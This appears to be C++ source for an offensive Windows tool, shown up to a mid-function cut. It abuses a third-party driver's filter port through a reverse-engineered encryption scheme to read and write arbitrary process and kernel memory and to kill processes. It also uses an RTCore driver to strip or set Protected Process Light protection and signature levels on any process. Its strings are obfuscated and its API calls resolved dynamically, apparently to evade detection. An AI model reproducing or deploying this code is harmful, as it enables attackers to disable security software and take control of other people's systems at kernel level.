#define NOMINMAX
#include <windows.h>
#include <algorithm>
#include <winsvc.h>
#include <string>
#include <vector>
#include <sstream>
#include <tlhelp32.h>
#include <iostream>
#include <psapi.h>
#include<fltuser.h>
#include<emmintrin.h>
#include<winnt.h>
#include "crypt.h"
#include "Controller.h"
#include "dynapi.h"
#include <userenv.h>

#pragma comment(lib, "userenv.lib")

BYTE Key[33] = {};
PVOID  SSDT_Items[0x1000] = { 0 };
HANDLE hPort = NULL;


#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "fltlib.lib")
#pragma comment(lib, "bcrypt.lib")

#pragma pack(1)
struct NEAC_FILTER_CONNECT {
    DWORD Magic;
    DWORD Version;
    BYTE EncKey[32];
};
#pragma pack()


unsigned char enc_imm[] =
{
    0x7A, 0x54, 0xE5, 0x41, 0x8B, 0xDB, 0xB0, 0x55, 0x7A, 0xBD,
    0x01, 0xBD, 0x1A, 0x7F, 0x9E, 0x17
};

void encrypt(unsigned int* buffer, unsigned int idx)
{
    __m128i v2; // xmm0
    unsigned int* result; // rax
    int v4; // r9d
    __m128i v5; // xmm0
    __m128i v8; // [rsp+20h] [rbp-18h] BYREF

    __m128i imm = _mm_load_si128((__m128i*)enc_imm);
    __m128i zero;
    memset(&zero, 0, sizeof(__m128i));
    v2 = _mm_cvtsi32_si128(idx);
    result = &v8.m128i_u32[3];
    v8 = _mm_xor_si128(
        _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_unpacklo_epi8(v2, v2), 0), 0),
        imm);
    v4 = 0;
    v5 = _mm_cvtsi32_si128(0x4070E1Fu);
    do
    {
        __m128i v6 = _mm_shufflelo_epi16(_mm_unpacklo_epi8(_mm_or_si128(_mm_cvtsi32_si128(*result), v5), zero), 27);
        v6 = _mm_packus_epi16(v6, v6);
        *buffer = (*buffer ^ ~idx) ^ v6.m128i_u32[0] ^ idx;
        ++buffer;
        result = (unsigned int*)((char*)result - 1);
        v4++;
    } while (v4 < 4);
    return;
}

void encode_payload(PBYTE key, PBYTE buffer, SIZE_T size) {
    for (int i = 0; i < size; i++) {
        buffer[i] ^= key[i & 31];
    }
    unsigned int* ptr = (unsigned int*)buffer;
    unsigned int v12 = 0;
    do
    {
        encrypt(ptr, v12++);
        ptr += 4;
    } while (v12 < size >> 4);
}

HANDLE connect_driver() {
    NEAC_FILTER_CONNECT lpContext;
    lpContext.Magic = 0x4655434B;
    lpContext.Version = 8;
    memcpy(lpContext.EncKey, Key, 32);
    HANDLE hPort;
    HRESULT hResult = FilterConnectCommunicationPort(SKW(L"\\OWNeacSafePort"),
        FLT_PORT_FLAG_SYNC_HANDLE,
        &lpContext,
        40,
        NULL,
        &hPort
    );
    if (hResult != S_OK || hPort == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    return hPort;
}

#pragma pack(1)
struct GET_PROC_BASE_PACKET {
    BYTE Opcode;
    DWORD Pid;
};
#pragma pack()
PVOID get_proc_base(HANDLE hPort, DWORD Pid) {
    const int buffersize = (sizeof(GET_PROC_BASE_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    GET_PROC_BASE_PACKET* ptr = (GET_PROC_BASE_PACKET*)buffer;
    ptr->Pid = Pid;
    ptr->Opcode = 32;
    encode_payload(Key, buffer, 16);

    BYTE result[16];
    DWORD out;
    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, result, 16, &out);
    if (hResult == S_OK) {
        PVOID* data = (PVOID*)result;
        return *data;
    }
    return NULL;
}
#pragma pack(1)
struct READ_MEMORY_PACKET {
    BYTE Opcode;
    DWORD Pid;
    PVOID Addr;
    DWORD Size;
};
#pragma pack()
DWORD read_proc_memory(HANDLE hPort, DWORD Pid, PVOID Addr, DWORD Size, PVOID Out) {
    const int buffersize = (sizeof(READ_MEMORY_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    READ_MEMORY_PACKET* ptr = (READ_MEMORY_PACKET*)buffer;
    ptr->Pid = Pid;
    ptr->Opcode = 9;
    ptr->Addr = Addr;
    ptr->Size = Size;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;

    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, Out, Size, &out_size);
    if (hResult == S_OK) {
        return out_size;
    }
    return 0;
}

#pragma pack(1)
struct WRITE_MEMORY_PACKET {
    BYTE Opcode;
    DWORD Pid;
    PVOID Addr;
    DWORD Size;
};
#pragma pack()

DWORD write_proc_memory(HANDLE hPort, DWORD Pid, PVOID Addr, DWORD Size, PVOID In) {
    const int buffersize = (sizeof(WRITE_MEMORY_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    WRITE_MEMORY_PACKET* ptr = (WRITE_MEMORY_PACKET*)buffer;
    ptr->Pid = Pid;
    ptr->Opcode = 61;
    ptr->Addr = Addr;
    ptr->Size = Size;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;

    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, In, Size, &out_size);
    if (hResult == S_OK) {
        return out_size;
    }
    return 0;
}

#pragma pack(1)
struct PROTECT_MEMORY_PACKET {
    BYTE Opcode;
    DWORD Pid;
    PVOID Addr;
    DWORD Size;
    DWORD NewProtect;
};
#pragma pack()

BOOL protect_memory(HANDLE hPort, DWORD Pid, PVOID Addr, DWORD Size, DWORD NewProtect) {
    const int buffersize = (sizeof(PROTECT_MEMORY_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    PROTECT_MEMORY_PACKET* ptr = (PROTECT_MEMORY_PACKET*)buffer;
    ptr->Pid = Pid;
    ptr->Opcode = 60;
    ptr->Addr = Addr;
    ptr->Size = Size;
    ptr->NewProtect = NewProtect;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;

    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, NULL, NULL, &out_size);
    if (hResult == S_OK) {
        return TRUE;
    }
    return FALSE;
}
#pragma pack(1)
struct START_WATCH_PACKET {
    BYTE Opcode;
    BYTE FunctionId;
    BYTE State;
};
#pragma pack()

BOOL update_state(HANDLE hPort, BYTE FunctionId, BYTE State) {
    const int buffersize = (sizeof(START_WATCH_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    START_WATCH_PACKET* ptr = (START_WATCH_PACKET*)buffer;
    ptr->Opcode = 1;
    ptr->FunctionId = FunctionId;
    ptr->State = State;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;

    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, NULL, NULL, &out_size);
    if (hResult == S_OK) {
        return TRUE;
    }
    return FALSE;
}

#pragma pack(1)
struct KERNEL_WRITE_PACKET {
    BYTE Opcode;
    PVOID Dst;
    PVOID Src;
    DWORD Size;
};
#pragma pack()

BOOL kernel_write_data(HANDLE hPort, PVOID Dst, PVOID Src, DWORD Size) {
    const int buffersize = (sizeof(KERNEL_WRITE_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    KERNEL_WRITE_PACKET* ptr = (KERNEL_WRITE_PACKET*)buffer;
    ptr->Opcode = 70;
    ptr->Dst = Dst;
    ptr->Src = Src;
    ptr->Size = Size;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;

    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, NULL, NULL, &out_size);
    if (hResult == S_OK) {
        return TRUE;
    }
    return FALSE;
}

#pragma pack(1)
struct KERNEL_READ_PACKET {
    BYTE Opcode;
    PVOID Src;
    DWORD Size;
};
#pragma pack()

BOOL kernel_read_data(HANDLE hPort, PVOID Dst, PVOID Src, DWORD Size) {
    const int buffersize = (sizeof(KERNEL_READ_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    KERNEL_READ_PACKET* ptr = (KERNEL_READ_PACKET*)buffer;
    ptr->Opcode = 14;
    ptr->Src = Src;
    ptr->Size = Size;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;
    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, Dst, Size, &out_size);
    if (hResult == S_OK) {
        return TRUE;
    }
    return FALSE;
}

#pragma pack(1)
struct KILL_PROCESS_PACKET {
    BYTE Opcode;
    DWORD Pid;
};
#pragma pack()

BOOL kill_process(HANDLE hPort, DWORD Pid) {
    const int buffersize = (sizeof(KILL_PROCESS_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    KILL_PROCESS_PACKET* ptr = (KILL_PROCESS_PACKET*)buffer;
    ptr->Opcode = 20;
    ptr->Pid = Pid;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;
    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, NULL, NULL, &out_size);
    if (hResult == S_OK) {
        return TRUE;
    }
    return FALSE;
}

#pragma pack(1)
struct GET_SSDT_PACKET {
    BYTE Opcode;
};
#pragma pack()

BOOL get_ssdt_items(HANDLE hPort, PVOID Out, DWORD Size) {
    const int buffersize = (sizeof(GET_SSDT_PACKET) / 16 + 1) * 16;
    BYTE buffer[buffersize];
    GET_SSDT_PACKET* ptr = (GET_SSDT_PACKET*)buffer;
    ptr->Opcode = 12;
    encode_payload(Key, buffer, buffersize);

    DWORD out_size;
    HRESULT hResult = FilterSendMessage(hPort, buffer, buffersize, Out, Size, &out_size);

    if (hResult == S_OK) {
        return TRUE;
    }
    return FALSE;
}



#pragma pack(1)
struct NOTIFY_MESSAGE_BASE {
    FILTER_MESSAGE_HEADER Header;
    BYTE NotifyType;
    DWORD MessageSize;
    DWORD64 Time;
};
struct PROCESS_NOTIFY_MESSAGE : NOTIFY_MESSAGE_BASE {
    DWORD64 Counter;
    BYTE Flag;
    BYTE CreateFlag;
    DWORD CurrentPid;
    DWORD CurrentTid;
    DWORD ParentPid;
    BYTE Padding[13];
    WCHAR ProcName1[512];
    WCHAR ProcName2[512];
    PVOID BackTrace[32];
};
#pragma pack()




DWORD parse_export_rva(const BYTE* moduleBase, const char* funcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDirEntry.VirtualAddress == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + exportDirEntry.VirtualAddress);
    DWORD* nameRvas = (DWORD*)(moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* funcRvas = (DWORD*)(moduleBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (const char*)(moduleBase + nameRvas[i]);
        if (_stricmp(name, funcName) == 0) {
            WORD ordinal = ordinals[i];
            return funcRvas[ordinal];
        }
    }
    return 0;
}
DWORD get_export_rva(const char* funcName) {
    char system32Path[MAX_PATH];

    GetSystemDirectoryA(system32Path, MAX_PATH);

    std::string kernelPath = std::string(system32Path) + SKA("\\ntoskrnl.exe");

    HANDLE hFile = CreateFileA(kernelPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    HANDLE hMapping = CreateFileMapping(
        hFile,
        NULL,
        SEC_IMAGE | PAGE_READONLY,
        0, 0,
        NULL
    );;
    if (!hMapping) {
        CloseHandle(hFile);
        return NULL;
    }
    const BYTE* fileBase = (const BYTE*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!fileBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return NULL;
    }

    DWORD rva = parse_export_rva(fileBase, funcName);
    UnmapViewOfFile(fileBase);

    CloseHandle(hMapping);
    CloseHandle(hFile);
    return rva;
}


PVOID find_krnl_images(PVOID PsLoadedModuleList, const wchar_t* name) {
    PVOID Ptr;
    kernel_read_data(hPort, &Ptr, PsLoadedModuleList, 8);
    WCHAR ModuleName[260] = { 0 };
    while (Ptr != PsLoadedModuleList) {
        memset(ModuleName, 0, sizeof(ModuleName));
        PVOID DllBase;
        kernel_read_data(hPort, &DllBase, (PBYTE)Ptr + 0x30, 8);

        USHORT NameSize;
        kernel_read_data(hPort, &NameSize, (PBYTE)Ptr + 0x58, 2);

        PVOID NameAddr;
        kernel_read_data(hPort, &NameAddr, (PBYTE)Ptr + 0x60, 8);

        kernel_read_data(hPort, &ModuleName, NameAddr, NameSize);
        if (!lstrcmpW(ModuleName, name)) {
            return DllBase;
        }
        kernel_read_data(hPort, &Ptr, Ptr, 8);
    }
    return NULL;
}


Controller::Controller()
{
	_rtc = new RTCore();
	_of = new OffsetFinder();

	_of->FindAllOffsets();
}

Controller::Controller(RTCore* rtc, OffsetFinder* of)
{
    _rtc = rtc;
    _of = of;
}

BOOL Controller::ListProtectedProcesses()
{
    PCTRL_PROCESS_INFO pProcessInfo = NULL;
    DWORD dwIndex, dwNumberOfProtectedProceses = 0;

    if (!GetProcessList(&pProcessInfo))
        return FALSE;

    g_log.Printf(LogLevel::Debug, SKW(L"[D] Controller::ListProtectedProcesses() Number of process entries: %d\n"), pProcessInfo->NumberOfEntries);

    g_log.Printf(LogLevel::Info, SKW(L"\n"));

    g_log.Printf(LogLevel::Info, SKW(L"[i]   PID  |  Level  |     Signer      |     EXE sig. level    |     DLL sig. level    |    Kernel addr.    \n"));
    g_log.Printf(LogLevel::Info, SKW(L"[i]  -------+---------+-----------------+-----------------------+-----------------------+--------------------\n"));

    for (dwIndex = 0; dwIndex < pProcessInfo->NumberOfEntries; dwIndex++)
    {
        if (pProcessInfo->Entries[dwIndex].ProtectionLevel > 0)
        {
            g_log.Printf(LogLevel::Info, SKW(L"[i]  %6d | %-3ws (%d) | %-11ws (%d) | %-14ws (0x%02x) | %-14ws (0x%02x) | 0x%016llx\n"),
                pProcessInfo->Entries[dwIndex].Pid,
                Utils::GetProtectionLevelAsString(pProcessInfo->Entries[dwIndex].ProtectionLevel),
                pProcessInfo->Entries[dwIndex].ProtectionLevel,
                Utils::GetSignerTypeAsString(pProcessInfo->Entries[dwIndex].SignerType),
                pProcessInfo->Entries[dwIndex].SignerType,
                Utils::GetSignatureLevelAsString(pProcessInfo->Entries[dwIndex].SignatureLevel),
                pProcessInfo->Entries[dwIndex].SignatureLevel,
                Utils::GetSignatureLevelAsString(pProcessInfo->Entries[dwIndex].SectionSignatureLevel),
                pProcessInfo->Entries[dwIndex].SectionSignatureLevel,
                pProcessInfo->Entries[dwIndex].KernelAddress
            );

            dwNumberOfProtectedProceses++;
        }
    }

    g_log.Printf(LogLevel::Info, SKW(L"\n"));

    g_log.Printf(LogLevel::Good, SKW(L"[+] Enumerated %d protected processes.\n"), dwNumberOfProtectedProceses);

    dynapi::pHeapFree(dynapi::pGetProcessHeap(), 0, pProcessInfo);

    return TRUE;
}

BOOL Controller::GetProcessProtection(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;
    UCHAR bProtectionLevel, bSignerType;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;
        
    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection > 0)
    {
        bProtectionLevel = Utils::GetProtectionLevel(bProtection);
        bSignerType = Utils::GetSignerType(bProtection);

        g_log.Printf(LogLevel::Good, SKW(L"[+] Controller::GetProcessProtection() The process with PID %d is a %ws with the Signer type '%ws' (%d).\n"),
            Pid,
            Utils::GetProtectionLevelAsString(bProtectionLevel),
            Utils::GetSignerTypeAsString(bSignerType),
            bSignerType
        );
    }
    else
    {
        g_log.Printf(LogLevel::Info, SKW(L"[i] Controller::GetProcessProtection() The process with PID %d is not protected.\n"), Pid);
    }

    return TRUE;
}

BOOL Controller::SetProcessProtection(DWORD Pid, LPCWSTR ProtectionLevel, LPCWSTR SignerType)
{
    ULONG_PTR pProcess;
    UCHAR bProtectionOld, bProtectionNew, bProtectionEffective;
    UCHAR bProtectionLevel, bSignerType;

    if (!(bProtectionLevel = Utils::GetProtectionLevelFromString(ProtectionLevel)))
        return FALSE;

    if (!(bSignerType = Utils::GetSignerTypeFromString(SignerType)))
        return FALSE;

    bProtectionNew = Utils::GetProtection(bProtectionLevel, bSignerType);

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtection(pProcess, &bProtectionOld))
        return FALSE;

    if (bProtectionOld == bProtectionNew)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::SetProcessProtection() The process with PID %d already has the protection '%ws-%ws'.\n"),
            Pid,
            Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtectionOld)),
            Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtectionOld))
        );

        return FALSE;
    }

    if (!SetProcessProtection(pProcess, bProtectionNew))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::SetProcessProtection() Failed to set Protection '%ws-%ws' on process with PID %d.\n"),
            Utils::GetProtectionLevelAsString(bProtectionLevel),
            Utils::GetSignerTypeAsString(bSignerType),
            Pid
        );

        return FALSE;
    }

    if (!GetProcessProtection(pProcess, &bProtectionEffective))
        return FALSE;

    if (bProtectionNew != bProtectionEffective)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::SetProcessProtection() Tried to set the protection '%ws-%ws', but the effective protection is: '%ws-%ws'.\n"),
            Utils::GetProtectionLevelAsString(bProtectionLevel),
            Utils::GetSignerTypeAsString(bSignerType),
            Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtectionEffective)),
            Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtectionEffective))
        );

        return FALSE;
    }

    g_log.Printf(LogLevel::Good, SKW(L"[+] The Protection '%ws-%ws' was set on the process with PID %d, previous protection was: '%ws-%ws'.\n"),
        Utils::GetProtectionLevelAsString(bProtectionLevel),
        Utils::GetSignerTypeAsString(bSignerType),
        Pid,
        Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtectionOld)),
        Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtectionOld))
    );

    return TRUE;
}

BOOL Controller::GetProcessSignatureLevels(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bSignatureLevel, bSectionSignatureLevel;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessSignatureLevel(pProcess, &bSignatureLevel))
        return FALSE;

    if (!GetProcessSectionSignatureLevel(pProcess, &bSectionSignatureLevel))
        return FALSE;

    g_log.Printf(LogLevel::Info, SKW(L"[i] The process with PID %d has the Signature level '%ws' (0x%02x) and the Section signature level '%ws' (0x%02x).\n"),
        Pid,
        Utils::GetSignatureLevelAsString(bSignatureLevel),
        bSignatureLevel,
        Utils::GetSignatureLevelAsString(bSectionSignatureLevel),
        bSectionSignatureLevel
    );

    return TRUE;
}

BOOL Controller::SetProcessSignatureLevels(DWORD Pid, LPCWSTR SignerType)
{
    ULONG_PTR pProcess;
    UCHAR bSignerType, bSignatureLevel, bSectionSignatureLevel;

    if (!(bSignerType = Utils::GetSignerTypeFromString(SignerType)))
        return FALSE;

    if ((bSignatureLevel = Utils::GetSignatureLevel(bSignerType)) == 0xff)
        return FALSE;

    if ((bSectionSignatureLevel = Utils::GetSectionSignatureLevel(bSignerType)) == 0xff)
        return FALSE;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!SetProcessSignatureLevel(pProcess, bSignatureLevel))
        return FALSE;

    if (!SetProcessSectionSignatureLevel(pProcess, bSectionSignatureLevel))
        return FALSE;

    g_log.Printf(LogLevel::Good, SKW(L"[+] The Signature level '%ws' and the Section signature level '%ws' were set on the process with PID %d.\n"),
        Utils::GetSignatureLevelAsString(bSignatureLevel),
        Utils::GetSignatureLevelAsString(bSectionSignatureLevel),
        Pid
    );

    return TRUE;
}

BOOL Controller::ProtectProcess(DWORD Pid, LPCWSTR ProtectionLevel, LPCWSTR SignerType)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection > 0)
    {
        g_log.Printf(LogLevel::Warn, SKW(L"[!] Controller::ProtectProcess The process with PID %d is already protected, current protection is %ws-%ws.\n"),
            Pid,
            Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtection)),
            Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtection))
        );

        return FALSE;
    }

    if (!SetProcessProtection(Pid, ProtectionLevel, SignerType))
        return FALSE;

    if (!SetProcessSignatureLevels(Pid, SignerType))
        return FALSE;

    return TRUE;
}

BOOL Controller::UnprotectProcess(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection == 0)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::UnprotectProcess() The process with PID %d is not protected, nothing to unprotect.\n"), Pid);
        return FALSE;
    }

    if (!SetProcessProtection(pProcess, 0))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::UnprotectProcess() Failed to set Protection level 'None' and Signer type 'None' on process with PID %d.\n"), Pid);
        return FALSE;
    }

    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection != 0)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::UnprotectProcess() The process with PID %d still appears to be protected.\n"), Pid);
        return FALSE;
    }

    if (!SetProcessSignatureLevel(pProcess, SE_SIGNING_LEVEL_UNCHECKED))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::UnprotectProcess() Failed to set Signature level '%ws' (0x%02x) on process with PID %d.\n"),
            Utils::GetSignatureLevelAsString(SE_SIGNING_LEVEL_UNCHECKED),
            SE_SIGNING_LEVEL_UNCHECKED,
            Pid
        );

        return FALSE;
    }

    if (!SetProcessSectionSignatureLevel(pProcess, SE_SIGNING_LEVEL_UNCHECKED))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::UnprotectProcess() Failed to set Section signature level '%ws' (0x%02x) on process with PID %d.\n"),
            Utils::GetSignatureLevelAsString(SE_SIGNING_LEVEL_UNCHECKED),
            SE_SIGNING_LEVEL_UNCHECKED,
            Pid
        );

        return FALSE;
    }

    g_log.Printf(LogLevel::Good, SKW(L"[+] The process with PID %d is no longer a PP(L).\n"), Pid);

    return TRUE;
}

BOOL Controller::GetInitialSystemProcessAddress(PULONG_PTR Addr)
{
    ULONG_PTR pKernelBase, pPsInitialSystemProcess, pInitialSystemProcess;

    *Addr = 0;

    if (!(pKernelBase = Utils::GetKernelBaseAddress()))
        return FALSE;

    if (!(pPsInitialSystemProcess = Utils::GetKernelAddress(pKernelBase, _of->GetOffset(Offset::KernelPsInitialSystemProcess))))
        return FALSE;

    g_log.Printf(LogLevel::Debug, SKW(L"[D] %ws @ 0x%016llx\n"), SKW(L"PsInitialSystemProcess"), pPsInitialSystemProcess);

    if (!(_rtc->ReadPtr(pPsInitialSystemProcess, &pInitialSystemProcess)))
        return FALSE;

    g_log.Printf(LogLevel::Debug, SKW(L"[D] System process @ 0x%016llx\n"), pInitialSystemProcess);

    *Addr = pInitialSystemProcess;

    return TRUE;
}

BOOL Controller::GetProcessKernelAddress(DWORD Pid, PULONG_PTR Addr)
{
    PCTRL_PROCESS_INFO pProcessInfo = NULL;
    DWORD dwIndex;
    ULONG_PTR pProcess = 0;

    if (!GetProcessList(&pProcessInfo))
        return FALSE;

    for (dwIndex = 0; dwIndex < pProcessInfo->NumberOfEntries; dwIndex++)
    {
        if (pProcessInfo->Entries[dwIndex].Pid == Pid)
        {
            pProcess = pProcessInfo->Entries[dwIndex].KernelAddress;
            break;
        }
    }

    dynapi::pHeapFree(dynapi::pGetProcessHeap(), 0, pProcessInfo);

    if (pProcess == 0)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::GetProcessKernelAddress() Failed to retrieve Kernel address of process with PID %d.\n"), Pid);
        return FALSE;
    }

    *Addr = pProcess;

    return TRUE;
}

BOOL Controller::GetProcessList(PCTRL_PROCESS_INFO *List)
{
    BOOL bResult = FALSE;
    PCTRL_PROCESS_INFO pProcessList = NULL, pProcessListNew;
    DWORD dwBaseSize = 4096, dwSize, dwNumberOfEntries = 0;
    DWORD64 dwProcessId;
    ULONG_PTR pProcess, pInitialSystemProcess;
    UCHAR bProtection, bSignatureLevel, bSectionSignatureLevel;

    if (!(pProcessList = (PCTRL_PROCESS_INFO)dynapi::pHeapAlloc(dynapi::pGetProcessHeap(), HEAP_ZERO_MEMORY, dwBaseSize)))
        return FALSE;

    dwSize = sizeof(pProcessList->NumberOfEntries);

    if (!GetInitialSystemProcessAddress(&pInitialSystemProcess))
        return FALSE;

    pProcess = pInitialSystemProcess;

    do
    {
        if (!(_rtc->Read64(pProcess + _of->GetOffset(Offset::ProcessUniqueProcessId), &dwProcessId)))
            break;

        g_log.Printf(LogLevel::Debug, SKW(L"[D] Process @ 0x%016llx has PID %d\n"), pProcess, (DWORD)dwProcessId);

        if (!GetProcessProtection(pProcess, &bProtection))
            break;

        if (!GetProcessSignatureLevel(pProcess, &bSignatureLevel))
            break;

        if (!GetProcessSectionSignatureLevel(pProcess, &bSectionSignatureLevel))
            break;

        dwSize += sizeof((*List)[0]);

        if (dwSize >= dwBaseSize)
        {
            dwBaseSize *= 2;
            if (!(pProcessListNew = (PCTRL_PROCESS_INFO)dynapi::pHeapReAlloc(dynapi::pGetProcessHeap(), HEAP_ZERO_MEMORY, pProcessList, dwBaseSize)))
                break;

            pProcessList = pProcessListNew;
        }

        pProcessList->Entries[dwNumberOfEntries].KernelAddress = pProcess;
        pProcessList->Entries[dwNumberOfEntries].Pid = (DWORD)dwProcessId;
        pProcessList->Entries[dwNumberOfEntries].ProtectionLevel = Utils::GetProtectionLevel(bProtection);
        pProcessList->Entries[dwNumberOfEntries].SignerType = Utils::GetSignerType(bProtection);
        pProcessList->Entries[dwNumberOfEntries].SignatureLevel = bSignatureLevel;
        pProcessList->Entries[dwNumberOfEntries].SectionSignatureLevel = bSectionSignatureLevel;

        dwNumberOfEntries++;

        if (!(_rtc->ReadPtr(pProcess + _of->GetOffset(Offset::ProcessActiveProcessLinks), &pProcess)))
            break;

        pProcess = pProcess - _of->GetOffset(Offset::ProcessActiveProcessLinks);

    } while (pProcess != pInitialSystemProcess);

    if (pProcess == pInitialSystemProcess)
    {
        pProcessList->NumberOfEntries = dwNumberOfEntries;
        bResult = TRUE;
        *List = pProcessList;
    }

    if (!bResult && pProcessList)
        dynapi::pHeapFree(dynapi::pGetProcessHeap(), 0, pProcessList);

    return bResult;
}

BOOL Controller::GetProcessProtection(ULONG_PTR Addr, PUCHAR Protection)
{
    UCHAR bProtection;

    if (!(_rtc->Read8(Addr + _of->GetOffset(Offset::ProcessProtection), &bProtection)))
    {
#ifdef _WIN64
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::GetProcessProtection() Failed to retrieve Protection attribute of process @ 0x%016llx.\n"), Addr);
#else
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::GetProcessProtection() Failed to retrieve Protection attribute of process @ 0x%08x.\n"), Addr);
#endif
        return FALSE;
    }

    *Protection = bProtection;

    return TRUE;
}

BOOL Controller::SetProcessProtection(ULONG_PTR Addr, UCHAR Protection)
{
    return _rtc->Write8(Addr + _of->GetOffset(Offset::ProcessProtection), Protection);
}

BOOL Controller::GetProcessSignatureLevel(ULONG_PTR Addr, PUCHAR SignatureLevel)
{
    UCHAR bSignatureLevel;

    if (!(_rtc->Read8(Addr + _of->GetOffset(Offset::ProcessSignatureLevel), &bSignatureLevel)))
    {
#ifdef _WIN64
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::GetProcessSignatureLevel() Failed to retrieve SignatureLevel attribute of process @ 0x%016llx.\n"), Addr);
#else
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::GetProcessSignatureLevel() Failed to retrieve SignatureLevel attribute of process @ 0x%08x.\n"), Addr);
#endif
        return FALSE;
    }

    *SignatureLevel = bSignatureLevel;

    return TRUE;
}

BOOL Controller::SetProcessSignatureLevel(ULONG_PTR Addr, UCHAR SignatureLevel)
{
    return _rtc->Write8(Addr + _of->GetOffset(Offset::ProcessSignatureLevel), SignatureLevel);
}

BOOL Controller::GetProcessSectionSignatureLevel(ULONG_PTR Addr, PUCHAR SectionSignatureLevel)
{
    UCHAR bSectionSignatureLevel;

    if (!(_rtc->Read8(Addr + _of->GetOffset(Offset::ProcessSectionSignatureLevel), &bSectionSignatureLevel)))
    {
#ifdef _WIN64
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::GetProcessSectionSignatureLevel() Failed to retrieve SectionSignatureLevel attribute of process @ 0x%016llx.\n"), Addr);
#else
        g_log.Printf(LogLevel::Error, SKW(L"[!] Controller::GetProcessSectionSignatureLevel() Failed to retrieve SectionSignatureLevel attribute of process @ 0x%08x.\n"), Addr);
#endif
        return FALSE;
    }

    *SectionSignatureLevel = bSectionSignatureLevel;

    return TRUE;
}

BOOL Controller::SetProcessSectionSignatureLevel(ULONG_PTR Addr, UCHAR SectionSignatureLevel)
{
    return _rtc->Write8(Addr + _of->GetOffset(Offset::ProcessSectionSignatureLevel), SectionSignatureLevel);
}


OffsetFinder::OffsetFinder()
{
    _KernelModule = dynapi::pLoadLibraryW(SKW(L"ntoskrnl.exe"));
